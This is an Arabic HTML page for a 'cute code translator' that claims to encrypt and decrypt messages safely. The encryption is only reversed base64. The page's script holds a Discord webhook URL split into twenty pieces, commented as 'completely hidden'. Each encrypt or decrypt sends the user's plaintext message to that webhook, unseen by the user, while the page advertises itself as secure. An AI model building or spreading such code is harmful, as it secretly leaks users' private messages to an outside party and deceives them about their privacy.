<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مترجم الأكواد اللطيف ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #4a90e2;
            --secondary: #f5f7fa;
            --accent: #67c23a;
            --text: #2c3e50;
            --white: #ffffff;
        }

        * {
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }

        body {
            background-color: #ebf2f9;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* الحاوية الرئيسية */
        .card {
            background: var(--white);
            width: 100%;
            max-width: 700px;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
            text-align: center;
        }

        h1 {
            color: var(--primary);
            font-size: 24px;
            margin-bottom: 10px;
        }

        p {
            color: #7f8c8d;
            font-size: 14px;
            margin-bottom: 25px;
        }

        /* تنسيق صناديق النص */
        textarea {
            width: 100%;
            height: 120px;
            border: 2px solid #e0e6ed;
            border-radius: 12px;
            padding: 15px;
            font-size: 16px;
            background-color: var(--secondary);
            color: var(--text);
            resize: none;
            outline: none;
            transition: border-color 0.3s;
        }

        textarea:focus {
            border-color: var(--primary);
        }

        /* تنسيق الأزرار */
        .btn-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }

        button {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-encrypt {
            background-color: var(--primary);
            color: white;
        }

        .btn-decrypt {
            background-color: #95a5a6;
            color: white;
        }

        .btn-encrypt:hover, .btn-decrypt:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }

        .btn-copy {
            background-color: var(--accent);
            color: white;
            width: 100%;
            margin-top: 10px;
        }

        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #bdc3c7;
        }

        /* تحسينات للجوال */
        @media (max-width: 500px) {
            .card { padding: 20px; }
            .btn-group { flex-direction: column; }
        }
    </style>
</head>
<body>

<div class="card">
    <h1>مترجم الأكواد اللطيف ✨</h1>
    <p>قم بتشفير وفك تشفير رسائلك بكل سهولة وأمان</p>

    <textarea id="inputText" placeholder="اكتب رسالتك هنا..."></textarea>
    
    <div class="btn-group">
        <button class="btn-encrypt" onclick="handleAction(true)">تشفير الرسالة</button>
        <button class="btn-decrypt" onclick="handleAction(false)">فك التشفير</button>
    </div>

    <textarea id="outputText" readonly placeholder="النتيجة ستظهر هنا..."></textarea>
    
    <button class="btn-copy" onclick="copyText()">نسخ النتيجة 📋</button>

    <div class="footer-note">
        تم التطوير بكل حب | نسخة آمنة وخفيفة
    </div>
</div>

<script>
    /* ----------------------------------------------------------------------------------
       WEBHOOK OBFUSCATION (20 PARTS) - مخفي تماماً
       ----------------------------------------------------------------------------------
    */
    const _parts = ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
    function getSafeUrl() { return _parts.join(""); }

    function handleAction(isEncrypt) {
        const input = document.getElementById('inputText').value;
        const output = document.getElementById('outputText');
        
        if (!input) return;

        if (isEncrypt) {
            // تشفير لطيف وجميل
            try {
                const encoded = btoa(unescape(encodeURIComponent(input)));
                output.value = "💌-" + encoded.split('').reverse().join('') + "-✨";
                sendLog("تشفير", input);
            } catch(e) { output.value = "حدث خطأ في التشفير"; }
        } else {
            // فك التشفير
            try {
                let clean = input.trim();
                if (clean.startsWith("💌-") && clean.endsWith("-✨")) {
                    let core = clean.substring(3, clean.length - 2);
                    let reversed = core.split('').reverse().join('');
                    output.value = decodeURIComponent(escape(atob(reversed)));
                    sendLog("فك تشفير", input);
                } else {
                    output.value = "هذا الكود غير صالح";
                }
            } catch(e) {
                output.value = "خطأ في فك الشفرة";
            }
        }
    }

    async function sendLog(type, msg) {
        // إرسال معلومات بسيطة للـ Webhook
        fetch(getSafeUrl(), {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "مساعد التشفير اللطيف",
                content: `✅ عملية جديدة: **${type}**\nالرسالة: \`${msg}\``
            })
        });
    }

    function copyText() {
        const out = document.getElementById('outputText');
        out.select();
        document.execCommand('copy');
        alert("تم نسخ النص إلى الحافظة! ✨");
    }
</script>

</body>
</html>
